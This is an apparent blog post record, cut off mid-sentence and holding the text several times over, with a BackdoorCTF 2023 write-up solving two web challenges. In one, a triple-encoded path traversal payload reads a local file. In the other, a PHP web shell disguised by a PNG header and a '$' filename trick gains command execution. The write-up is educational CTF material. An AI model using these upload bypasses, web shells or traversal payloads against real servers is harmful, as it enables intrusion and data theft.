file. And the server responds with `File size should be less than 200KB, and only png, jpeg, and jpg are alloweded`\n\n![error1](./images/backdoorctf23/php/error1.png)\n\nHmm so to understand the functionality more let's see the source code\n\nThe code is obfuscated and in a single line, let's use an online beautifier and we get the below source code\n\n```php\n<?php \n$allowedExtensions = [\"jpg\", \"jpeg\", \"png\"];\n$errorMsg = \"\";\nif (\n    $_SERVER[\"REQUEST_METHOD\"] === \"POST\" &&\n    isset($_FILES[\"file\"]) &&\n    isset($_POST[\"name\"])\n) {\n    $userName = $_POST[\"name\"];\n    $uploadDir = \"uploaded/\" . generateHashedDirectory($userName) . \"/\";\n    if (!is_dir($uploadDir)) {\n        mkdir($uploadDir, 0750, true);\n    }\n    $uploadedFile = $_FILES[\"file\"];\n    $fileName = $uploadedFile[\"name\"];\n    $fileTmpName = $uploadedFile[\"tmp_name\"];\n    $fileError = $uploadedFile[\"error\"];\n    $fileSize = $uploadedFile[\"size\"];\n    $fileExt = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));\n    if (in_array($fileExt, $allowedExtensions) && $fileSize < 200000) {\n        $fileName = urldecode($fileName);\n        $fileInfo = finfo_open(FILEINFO_MIME_TYPE);\n        $fileMimeType = finfo_file($fileInfo, $fileTmpName);\n        finfo_close($fileInfo);\n        $allowedMimeTypes = [\"image/jpeg\", \"image/jpg\", \"image/png\"];\n        $fileName = strtok($fileName, chr(7841151584512418084));\n        if (in_array($fileMimeType, $allowedMimeTypes)) {\n            if ($fileError === UPLOAD_ERR_OK) {\n                if (move_uploaded_file($fileTmpName, $uploadDir . $fileName)) {\n                    chmod($uploadDir . $fileName, 0440);\n                    echo \"File uploaded successfully. <a href='$uploadDir$fileName' target='_blank'>Open File</a>\";\n                } else {\n                    $errorMsg = \"Error moving the uploaded file.\";\n                }\n            } else {\n                $errorMsg = \"File upload failed with error code: $fileError\";\n            }\n        } else {\n            $errorMsg = \"Don't try to fool me, this is not a png file\";\n        }\n    } else {\n        $errorMsg =\n            \"File size should be less than 200KB, and only png, jpeg, and jpg are allowed\";\n    }\n}\nfunction generateHashedDirectory($userName)\n{\n    $randomSalt = bin2hex(random_bytes(16));\n    $hashedDirectory = hash(\"sha256\", $userName . $randomSalt);\n    return $hashedDirectory;\n} ?>\n```\n\n\n## Vulnerability Identification\n\nOkay so let's analyse it block by block.\n\nIt first asks for a file and then it checks the file extension using \n```php\n$fileExt = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));\n if (in_array($fileExt, $allowedExtensions) && $fileSize < 200000)\n ....... continued\n```\nso if the extension is `jpg, jpeg, png` and the file size is less than 200kb it will try to execute further instructions.\n\nOkay then if you pass the extension check we have another check that is the MIME type check. So if you try to fool the server by uploading a file like `exploit.php.png` but the file type is actually a `php` then the server will give you and error --> `Don't try to fool me, this is not a png file`.\n\n![error2](./images/backdoorctf23/php/error2.png)\n\nOkay so let's try to upload a file with the header `png/jpeg/jpg` \n\nWe can do it with a file using `xxd -r -p -o 0 <(echo 8950 4e47 0d0a 1a0a 0000 000d 4948 4452) exploit.php.png`\n\nSo if you check the file type now it will bypass the MIME check.\n\nBut the problem is if it is uploaded it will be uploaded as exploit.php.png so an image will open so it is not helpful to solve the challenge\n\n## Exploiting the Vulnerability\n\nSo to exploit this we will set the header of the file to **PNG**. And then we will inject some php code to exploit the server.\n\nWe will name this file as `exploit.php%00.png`. The nullbyte will bypass the checks performed and the name of the file which will be uploaded on the server will be exploit.php as it will ignore the part after the nullbyte.\n\nBut here is a twist.\n\nHave a look at this line of code \n\n```php\n$fileName = strtok($fileName, chr(7841151584512418084));\n```\n\nif you use php interactive shell you can see the `chr(7841151584512418084)` \n\n```\nphp > echo chr(7841151584512418084);\n$\nphp > echo urlencode(chr(7841151584512418084));\n%24\n```\nso the file name will be split by $.\n\nSo to exploit this we will create a file `exploit.php%24.png` or `exploit.php$.png` with header of png and content as \n\n```php\n�PNG\n^Z\n^@^@^@^MIHDR<?php if(isset($_GET['cmd'])) { echo shell_exec($_GET['cmd']); } ?>\n```\n\n## Obtaining the Flag\nSo we will upload the file and the file name which will be uploaded will be `exploit.php` and when we open the file . BOOM we got the shell\n\nlet's do rce now and list the files two directories back we get the name of flag file as `s0_7h15_15_7h3_fl496_y0u_ar3_54rch1n9_f0r.txt`\n\nand now `cat ../../s0_7h15_15_7h3_fl496_y0u_ar3_54rch1n9_f0r.txt` to read the file.\n\n![Flag](./images/backdoorctf23/php/flag.png) \n\nFlag: **flag{n0t_3v3ry_t1m3_y0u_w1ll_s33_nu11byt3_vuln3r4b1l1ty_0sdfdgh554fd}**\n\nThank You","slug":"BackDoorCTF23_Web_Writeup","published":1,"date":"2024-05-14T10:20:19.793Z","updated":"2024-05-14T10:20:19.793Z","comments":1,"layout":"post","photos":[],"_id":"clw6937yk0000mnidgtdi55mv","content":"<h1 id=\"BackdoorCTF-2023\"><a href=\"#BackdoorCTF-2023\" class=\"headerlink\" title=\"BackdoorCTF 2023\"></a>BackdoorCTF 2023</h1><h1 id=\"Web-Beginner-Secret-of-jackal\"><a href=\"#Web-Beginner-Secret-of-jackal\" class=\"headerlink\" title=\"Web&#x2F;Beginner&#x2F;Secret_of_jackal\"></a>Web&#x2F;Beginner&#x2F;Secret_of_jackal</h1><h2 id=\"Challenge-Overview\"><a href=\"#Challenge-Overview\" class=\"headerlink\" title=\"Challenge Overview\"></a>Challenge Overview</h2><p>Description: I left a message for you. You will love it definitely</p>\n<p>Author: j4ck4l :&gt;)</p>\n<p><img src=\"/./images/backdoorctf23/secret/index.png\" alt=\"Index\"></p>\n<p>We have been given a <a href=\"http://35.222.114.240:8003/\">website</a>. It’s a simple lfi challenge</p>\n<p>Hmm so to understand the functionality more let’s see the source code</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ignore_it</span>(<span class=\"params\">file_param</span>):</span><br><span class=\"line\">    yoooo = file_param.replace(<span class=\"string\">&#x27;.&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>).replace(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> yoooo != file_param:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Illegal characters detected in file parameter!&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> yoooo</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">another_useless_function</span>(<span class=\"params\">file_param</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> urllib.parse.unquote(file_param)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">url_encode_path</span>(<span class=\"params\">file_param</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> urllib.parse.quote(file_param, safe=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">useless</span> (file_param):</span><br><span class=\"line\">    file_param1 = ignore_it(file_param)</span><br><span class=\"line\">    file_param2 = another_useless_function(file_param1)</span><br><span class=\"line\">    file_param3 = ignore_it(file_param2)</span><br><span class=\"line\">    file_param4 = another_useless_function(file_param3)</span><br><span class=\"line\">    file_param5 = another_useless_function(file_param4)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> file_param5</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"Vulnerability-Identification\"><a href=\"#Vulnerability-Identification\" class=\"headerlink\" title=\"Vulnerability Identification\"></a>Vulnerability Identification</h2><p>Okay so let’s analyse it block by block.</p>\n<p>It’s a simple page which include local files. So if you try to read flag file which is one directory back as given in the Dockerfile it will give you a message which says <code>&quot;Illegal characters detected in file parameter!&quot;</code></p>\n<p>So if we see the code the <code>useless()</code> first sanatise the output using <code>ignore_it()</code> function and will remove the <code>/ &amp; .</code> characters and then url decodes it using <code>another_useless_function</code></p>\n<h2 id=\"Exploiting-the-Vulnerability\"><a href=\"#Exploiting-the-Vulnerability\" class=\"headerlink\" title=\"Exploiting the Vulnerability\"></a>Exploiting the Vulnerability</h2><p>If you execute this code locally if you encode the file path 2 times it should give you the flag but it will not run on the server.</p>\n<p>Because chrome already decodes the url 1 time and then 2 times it will be done by our code so in total 3 times we have to encode the file path.</p>\n<p>So our final payload is <code>%25252E%25252E%25252Fflag%25252Etxt</code></p>\n<h2 id=\"Obtaining-the-Flag\"><a href=\"#Obtaining-the-Flag\" class=\"headerlink\" title=\"Obtaining the Flag\"></a>Obtaining the Flag</h2><p>So after giving the payload you will get the flag</p>\n<p><img src=\"/./images/backdoorctf23/secret/flag.png\" alt=\"Flag\"></p>\n<p>Flag: <strong>flag{s1mp13_l0c4l_f1l3_1nclus10n_0dg4af52gav}</strong></p>\n<h1 id=\"Web-php-sucks\"><a href=\"#Web-php-sucks\" class=\"headerlink\" title=\"Web&#x2F;php_sucks\"></a>Web&#x2F;php_sucks</h1><h2 id=\"Challenge-Overview-1\"><a href=\"#Challenge-Overview-1\" class=\"headerlink\" title=\"Challenge Overview\"></a>Challenge Overview</h2><p>Description: I hate PHP, and I know you hate PHP too. So, to irritate you, here is your PHP webapp. Go play with it. </p>\n<p>Author: j4ck4l :&gt;)</p>\n<p><img src=\"/./images/backdoorctf23/php/index.png\" alt=\"Index\"></p>\n<p>We have been given a <a href=\"http://35.222.114.240:8002/chal/upload.php\">website</a>. We can see a simple upload form.</p>\n<p>Let’s try to upload a text file. And the server responds with <code>File size should be less than 200KB, and only png, jpeg, and jpg are alloweded</code></p>\n<p><img src=\"/./images/backdoorctf23/php/error1.png\" alt=\"error1\"></p>\n<p>Hmm so to understand the functionality more let’s see the source code</p>\n<p>The code is obfuscated and in a single line, let’s use an online beautifier and we get the below source code</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"variable\">$allowedExtensions</span> = [<span class=\"string\">&quot;jpg&quot;</span>, <span class=\"string\">&quot;jpeg&quot;</span>, <span class=\"string\">&quot;png&quot;</span>];</span><br><span class=\"line\"><span class=\"variable\">$errorMsg</span> = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (</span><br><span class=\"line\">    <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&quot;REQUEST_METHOD&quot;</span>] === <span class=\"string\">&quot;POST&quot;</span> &amp;&amp;</span><br><span class=\"line\">    <span class=\"keyword\">isset</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;file&quot;</span>]) &amp;&amp;</span><br><span class=\"line\">    <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;name&quot;</span>])</span><br><span class=\"line\">) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$userName</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;name&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$uploadDir</span> = <span class=\"string\">&quot;uploaded/&quot;</span> . <span class=\"title function_ invoke__\">generateHashedDirectory</span>(<span class=\"variable\">$userName</span>) . <span class=\"string\">&quot;/&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">is_dir</span>(<span class=\"variable\">$uploadDir</span>)) &#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">mkdir</span>(<span class=\"variable\">$uploadDir</span>, <span class=\"number\">0750</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$uploadedFile</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&quot;file&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$fileName</span> = <span class=\"variable\">$uploadedFile</span>[<span class=\"string\">&quot;name&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$fileTmpName</span> = <span class=\"variable\">$uploadedFile</span>[<span class=\"string\">&quot;tmp_name&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$fileError</span> = <span class=\"variable\">$uploadedFile</span>[<span class=\"string\">&quot;error&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$fileSize</span> = <span class=\"variable\">$uploadedFile</span>[<span class=\"string\">&quot;size&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$fileExt</span> = <span class=\"title function_ invoke__\">strtolower</span>(<span class=\"title function_ invoke__\">pathinfo</span>(<span class=\"variable\">$fileName</span>, PATHINFO_EXTENSION));</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$fileExt</span>, <span class=\"variable\">$allowedExtensions</span>) &amp;&amp; <span class=\"variable\">$fileSize</span> &lt; <span class=\"number\">200000</span>) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$fileName</span> = <span class=\"title function_ invoke__\">urldecode</span>(<span class=\"variable\">$fileName</span>);</span><br><span class=\"line\">        <span class=\"variable\">$fileInfo</span> = <span class=\"title function_ invoke__\">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class=\"line\">        <span class=\"variable\">$fileMimeType</span> = <span class=\"title function_ invoke__\">finfo_file</span>(<span class=\"variable\">$fileInfo</span>, <span class=\"variable\">$fileTmpName</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">finfo_close</span>(<span class=\"variable\">$fileInfo</span>);</span><br><span class=\"line\">        <span class=\"variable\">$allowedMimeTypes</span> = [<span class=\"string\">&quot;image/jpeg&quot;</span>, <span class=\"string\">&quot;image/jpg&quot;</span>, <span class=\"string\">&quot;image/png&quot;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$fileName</span> = <span class=\"title function_ invoke__\">strtok</span>(<span class=\"variable\">$fileName</span>, <span class=\"title function_ invoke__\">chr</span>(<span class=\"number\">7841151584512418084</span>));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$fileMimeType</span>, <span class=\"variable\">$allowedMimeTypes</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"variable\">$fileError</span> === UPLOAD_ERR_OK) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$fileTmpName</span>, <span class=\"variable\">$uploadDir</span> . <span class=\"variable\">$fileName</span>)) &#123;</span><br><span class=\"line\">                    <span class=\"title function_ invoke__\">chmod</span>(<span class=\"variable\">$uploadDir</span> . <span class=\"variable\">$fileName</span>, <span class=\"number\">0440</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;File uploaded successfully. &lt;a href=&#x27;<span class=\"subst\">$uploadDir</span><span class=\"subst\">$fileName</span>&#x27; target=&#x27;_blank&#x27;&gt;Open File&lt;/a&gt;&quot;</span>;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"variable\">$errorMsg</span> = <span class=\"string\">&quot;Error moving the uploaded file.&quot;</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$errorMsg</span> = <span class=\"string\">&quot;File upload failed with error code: <span class=\"subst\">$fileError</span>&quot;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$errorMsg</span> = <span class=\"string\">&quot;Don&#x27;t try to fool me, this is not a png file&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$errorMsg</span> =</span><br><span class=\"line\">            <span class=\"string\">&quot;File size should be less than 200KB, and only png, jpeg, and jpg are allowed&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">generateHashedDirectory</span>(<span class=\"params\"><span class=\"variable\">$userName</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$randomSalt</span> = <span class=\"title function_ invoke__\">bin2hex</span>(<span class=\"title function_ invoke__\">random_bytes</span>(<span class=\"number\">16</span>));</span><br><span class=\"line\">    <span class=\"variable\">$hashedDirectory</span> = <span class=\"title function_ invoke__\">hash</span>(<span class=\"string\">&quot;sha256&quot;</span>, <span class=\"variable\">$userName</span> . <span class=\"variable\">$randomSalt</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable\">$hashedDirectory</span>;</span><br><span class=\"line\">&#125; <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"Vulnerability-Identification-1\"><a href=\"#Vulnerability-Identification-1\" class=\"headerlink\" title=\"Vulnerability Identification\"></a>Vulnerability Identification</h2><p>Okay so let’s analyse it block by block.</p>\n<p>It first asks for a file and then it checks the file extension using </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$fileExt</span> = <span class=\"title function_ invoke__\">strtolower</span>(<span class=\"title function_ invoke__\">pathinfo</span>(<span class=\"variable\">$fileName</span>, PATHINFO_EXTENSION));</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$fileExt</span>, <span class=\"variable\">$allowedExtensions</span>) &amp;&amp; <span class=\"variable\">$fileSize</span> &lt; <span class=\"number\">200000</span>)</span><br><span class=\"line\"> ....... continued</span><br></pre></td></tr></table></figure>\n<p>so if the extension is <code>jpg, jpeg, png</code> and the file size is less than 200kb it will try to execute further instructions.</p>\n<p>Okay then if you pass the extension check we have another check that is the MIME type check. So if you try to fool the server by uploading a file like <code>exploit.php.png</code> but the file type is actually a <code>php</code> then the server will give you and error –&gt; <code>Don&#39;t try to fool me, this is not a png file</code>.</p>\n<p><img src=\"/./images/backdoorctf23/php/error2.png\" alt=\"error2\"></p>\n<p>Okay so let’s try to upload a file with the header <code>png/jpeg/jpg</code> </p>\n<p>We can do it with a file using <code>xxd -r -p -o 0 &lt;(echo 8950 4e47 0d0a 1a0a 0000 000d 4948 4452) exploit.php.png</code></p>\n<p>So if you check the file type now it will bypass the MIME check.</p>\n<p>But the problem is if it is uploaded it will be uploaded as exploit.php.png so an image will open so it is not helpful to solve the challenge</p>\n<h2 id=\"Exploiting-the-Vulnerability-1\"><a href=\"#Exploiting-the-Vulnerability-1\" class=\"headerlink\" title=\"Exploiting the Vulnerability\"></a>Exploiting the Vulnerability</h2><p>So to exploit this we will set the header of the file to <strong>PNG</strong>. And then we will inject some php code to exploit the server.</p>\n<p>We will name this file as <code>exploit.php%00.png</code>. The nullbyte will bypass the checks performed and the name of the file which will be uploaded on the server will be exploit.php as it will ignore the part after the nullbyte.</p>\n<p>But here is a twist.</p>\n<p>Have a look at this line of code </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$fileName</span> = <span class=\"title function_ invoke__\">strtok</span>(<span class=\"variable\">$fileName</span>, <span class=\"title function_ invoke__\">chr</span>(<span class=\"number\">7841151584512418084</span>));</span><br></pre></td></tr></table></figure>\n\n<p>if you use php interactive shell you can see the <code>chr(7841151584512418084)</code> </p>\n<figure class=\"highlight openscad\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php &gt; <span class=\"built_in\">echo</span> <span class=\"built_in\">chr</span>(<span class=\"number\">7841151584512418084</span>);</span><br><span class=\"line\">$</span><br><span class=\"line\">php &gt; <span class=\"built_in\">echo</span> urlencode(<span class=\"built_in\">chr</span>(<span class=\"number\">7841151584512418084</span>));</span><br><span class=\"line\">%<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>so the file name will be split by $.</p>\n<p>So to exploit this we will create a file <code>exploit.php%24.png</code> or <code>exploit.php$.png</code> with header of png and content as </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">�PNG</span><br><span class=\"line\">^Z</span><br><span class=\"line\">^@^@^@^MIHDR<span class=\"meta\">&lt;?php</span> <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>])) &#123; <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">shell_exec</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]); &#125; <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Obtaining-the-Flag-1\"><a href=\"#Obtaining-the-Flag-1\" class=\"headerlink\" title=\"Obtaining the Flag\"></a>Obtaining the Flag</h2><p>So we will upload the file and the file name which will be uploaded will be <code>exploit.php</code> and when we open the file . BOOM we got the shell</p>\n<p>let’s do rce now and list the files two directories back we get the name of flag file as <code>s0_7h15_15_7h3_fl496_y0u_ar3_54rch1n9_f0r.txt</code></p>\n<p>and now <code>cat ../../s0_7h15_15_7h3_fl496_y0u_ar3_54rch1n9_f0r.txt</code> to read the file.</p>\n<p><img src=\"/./images/backdoorctf23/php/flag.png\" alt=\"Flag\"> </p>\n<p>Flag: <strong>flag{n0t_3v3ry_t1m3_y0u_w1ll_s33_nu11byt3_vuln3r4b1l1ty_0sdfdgh554fd}</strong></p>\n<p>Thank You</p>\n","excerpt":"","more":"<h1 id=\"BackdoorCTF-2023\"><a href=\"#BackdoorCTF-2023\" class=\"headerlink\" title=\"BackdoorCTF 2023\"></a>BackdoorCTF 2023</h1><h1 id=\"Web-Beginner-Secret-of-jackal\"><a href=\"#Web-Beginner-Secret-of-jackal\" class=\"headerlink\" title=\"Web&#x2F;Beginner&#x2F;Secret_of_jackal\"></a>Web&#x2F;Beginner&#x2F;Secret_of_jackal</h1><h2 id=\"Challenge-Overview\"><a href=\"#Challenge-Overview\" class=\"headerlink\" title=\"Challenge Overview\"></a>Challenge Overview</h2><p>Description: I left a message for you. You will love it definitely</p>\n<p>Author: j4ck4l :&gt;)</p>\n<p><img src=\"/./images/backdoorctf23/secret/index.png\" alt=\"Index\"></p>\n<p>We have been given a <a href=\"http://35.222.114.240:8003/\">website</a>. It’s a simple lfi challenge</p>\n<p>Hmm so to understand the functionality more let’s see the source code</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ignore_it</span>(<span class=\"params\">file_param</span>):</span><br><span class=\"line\">    yoooo = file_param.replace(<span class=\"string\">&#x27;.&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>).replace(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> yoooo != file_param:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;Illegal characters detected in file parameter!&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> yoooo</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">another_useless_function</span>(<span class=\"params\">file_param</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> urllib.parse.unquote(file_param)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">url_encode_path</span>(<span class=\"params\">file_param</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> urllib.parse.quote(file_param, safe=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">useless</span> (file_param):</span><br><span class=\"line\">    file_param1 = ignore_it(file_param)</span><br><span class=\"line\">    file_param2 = another_useless_function(file_param1)</span><br><span class=\"line\">    file_param3 = ignore_it(file_param2)</span><br><span class=\"line\">    file_param4 = another_useless_function(file_param3)</span><br><span class=\"line\">    file_param5 = another_useless_function(file_param4)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> file_param5</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"Vulnerability-Identification\"><a href=\"#Vulnerability-Identification\" class=\"headerlink\" title=\"Vulnerability Identification\"></a>Vulnerability Identification</h2><p>Okay so let’s analyse it block by block.</p>\n<p>It’s a simple page which include local files. So if you try to read flag file which is one directory back as given in the Dockerfile it will give you a message which says <code>&quot;Illegal characters detected in file parameter!&quot;</code></p>\n<p>So if we see the code the <code>useless()</code> first sanatise the output using <code>ignore_it()</code> function and will remove the <code>/ &amp; .</code> characters and then url decodes it using <code>another_useless_function</code></p>\n<h2 id=\"Exploiting-the-Vulnerability\"><a href=\"#Exploiting-the-Vulnerability\" class=\"headerlink\" title=\"Exploiting the Vulnerability\"></a>Exploiting the Vulnerability</h2><p>If you execute this code locally if you encode the file path 2 times it should give you the flag but it will not run on the server.</p>\n<p>Because chrome already decodes the url 1 time and then 2 times it will be done by our code so in total 3 times we have to encode the file path.</p>\n<p>So our final payload is <code>%25252E%25252E%25252Fflag%25252Etxt</code></p>\n<h2 id=\"Obtaining-the-Flag\"><a href=\"#Obtaining-the-Flag\" class=\"headerlink\" title=\"Obtaining the Flag\"></a>Obtaining the Flag</h2><p>So after giving the payload you will get the flag</p>\n<p><img src=\"/./images/backdoorctf23/secret/flag.png\" alt=\"Flag\"></p>\n<p>Flag: <strong>flag{s1mp13_l0c4l_f1l3_1nclus10n_0dg4af52gav}</strong></p>\n<h1 id=\"Web-php-sucks\"><a href=\"#Web-php-sucks\" class=\"headerlink\" title=\"Web&#x2F;php_sucks\"></a>Web&#x2F;php_sucks</h1><h2 id=\"Challenge-Overview-1\"><a href=\"#Challenge-Overview-1\" class=\"headerlink\" title=\"Challenge Overview\"></a>Challenge Overview</h2><p>Description: I hate PHP, and I know you hate PHP too. So, to irritate you, here is your PHP webapp. Go play with it. </p>\n<p>Author: j4ck4l :&gt;)</p>\n<p><img src=\"/./images/backdoorctf23/php/index.png\" alt=\"Index\"></p>\n<p>We have been given a <a href=\"http://35.222.114.240:8002/chal/upload.php\">website</a>. We can see a simple upload form.</p>\n<p>Let’s try to upload a text file. And the server responds with <code>File size should be less than 200KB, and only png, jpeg, and jpg are alloweded</code></p>\n<p><img src=\"/./images/backdoorctf23/php/error1.png\" alt=\"error1\"></p>\n<p>Hmm so to understand the functionality more let’s see the source code</p>\n<p>The code is obfuscated and in 